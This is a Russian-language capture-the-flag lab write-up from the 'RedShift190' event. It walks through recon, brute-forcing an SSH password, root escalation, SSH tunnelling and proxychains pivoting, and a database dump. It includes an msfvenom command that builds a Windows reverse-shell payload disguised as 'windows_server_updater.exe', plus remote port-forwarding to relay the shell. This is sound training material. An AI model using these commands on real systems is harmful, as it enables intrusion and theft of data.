
---

***Предисловие***: Данный стенд был подготовлен в рамках мероприятия "***RedShift190***", которое проводил Колледж программирования и Кибербезопасности.

Автор: Abends

---
### Часть 1. Разведка

Для начала в рамках нашей подсети производит сканирование через Nmap на наличие доступных хостов:

![ScreenShot](screenshots/2.png)

Нам удалось найти хост с IP-адресом **172.80.50.10**, который далее сканируем более детально:

![ScreenShot](screenshots/3.png)

Находим FTP с возможностью авторизации от лица anonymous. Входим:

![ScreenShot](screenshots/4.png)

Скачиваем себе все файлы для дальнейшего исследования:

![ScreenShot](screenshots/5.png)

---
### Часть 2. Исследование найденной информации. Захват первого хоста

Среди всех найденных интересных документов, раскрывающих подробности "миссии по колонизации Марса", есть простой текстовый документ ***ToDo.txt***, который содержит в себе следующую информацию:

![ScreenShot](screenshots/6.png)

Список дел, который подписан неким "***kevin***", возможно, это один из пользователей первого хоста. Вот только пароль мы не находим, а из открытых портов остался только SSH, поэтому пробуем сбрутить пароль:

![ScreenShot](screenshots/7.png)

Мы получили пароль "***gabriela***". Подключаемся по SSH к хосту и сразу проверяем сетевые интерфейсы:

![ScreenShot](screenshots/8.png)

Как видим, у этого хоста два сетевых интерфейса, смотрящих в разные подсети:
- 172.80.50.0/24;
- 192.168.20.10/24.

Что по повышению привилегий? А все просто:

![ScreenShot](screenshots/9.png)

С помощью `sudo -i` повышаемся до root-пользователя:

![ScreenShot](screenshots/10.png)

Далее меняем конфиг SSH на Ubuntu для возможности делать в дальнейшем SSH-туннели (не забываем перезапустить службу SSH):

```sh
# /etc/ssh/sshd_config

Port 22
GatewayPorts yes
AllowTcpForwarding yes
```

Также активируем параметр `net.ipv4.ip_forward` для пересылки пакетов между сетевыми интерфейсами:

```sh
# /etc/sysctl.conf

net.ipv4.ip_forward=1
```

Для проверки активации данного параметра необходимо в терминале ввести `sudo sysctl -p`:

![ScreenShot](screenshots/11.png)

На Kali Linux активируем proxychains4:

```sh
# /etc/proxychains4.conf

socks4 127.0.0.1 8888
```

---
### Часть 3. Исследование второго сегмента сети. Получение доступа к контроллеру домена

Сканируем второй сегмент сети при помощи Nmap:

![ScreenShot](screenshots/12.png)

Пробуем подключиться к ***PostgreSQL*** на хосте ***192.168.20.17***. Используем для этого ***proxychains4***. Для начала создаем динамический SSH-туннель (Dynamic Port Forwarding) в фоновом режиме:

![ScreenShot](screenshots/13.png)

Далее пробуем подключиться по одним из дефолтных кредов - ***postgres***:***postgres***:

![ScreenShot](screenshots/14.png)

Нам не удается подключиться, поэтому смотрим другой вектор. Вспоминает, что в файле "***ToDo.txt***" было упоминание о необходимости установить обновление для Windows Server. Подбросим вредоносный файл на FTP-сервер, который даст нам возможность реализовать reverse shell. Для начала подготовим ВПО при помощи ***msfvenom***:

```sh
kali>$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.20.10 LPORT=22222 -f exe -a x64 --platform windows > windows_server_updater.exe
```

Подключение производится на FTP-сервер, а с FTP-сервера будет перенаправление на Kali Linux. Для этого необходимо реализовать удаленный проброс портов (Remote Port Forwarding):

```sh
kali>$ ssh -R 192.168.20.10:22222:localhost:22222 kevin@192.168.20.10 -f -N
```

![ScreenShot](screenshots/15.png)

Загружаем ВПО на FTP-сервер:

![ScreenShot](screenshots/16.png)

> Через SSH на FTP-сервер сделаем `chmod 777 windows_server_updater.exe`

Прослушиваем порт 22222 на Kali Linux:

![ScreenShot](screenshots/17.png)

Теперь имитируем скачивание и активацию файла со стороны администратора домена:

![ScreenShot](screenshots/18.png)

![ScreenShot](screenshots/19.png)

![ScreenShot](screenshots/20.png)

Находим и читаем файл с логином и паролем от PostgreSQL:

![ScreenShot](screenshots/21.png)

---
### Часть 4. Получение доступа к БД

По найденным данным подключаемся к БД:

![ScreenShot](screenshots/22.png)

С помощью команды `\d+` просматриваем таблицы в ***postgres***:

![ScreenShot](screenshots/23.png)

Далее делаем запрос на получение данных: `SELECT * FROM "CyberAtom_Mars_mission_candidates";`:

![ScreenShot](screenshots/24.png)

Вот мы и получили доступ к заветным данным... На этом всё!

---
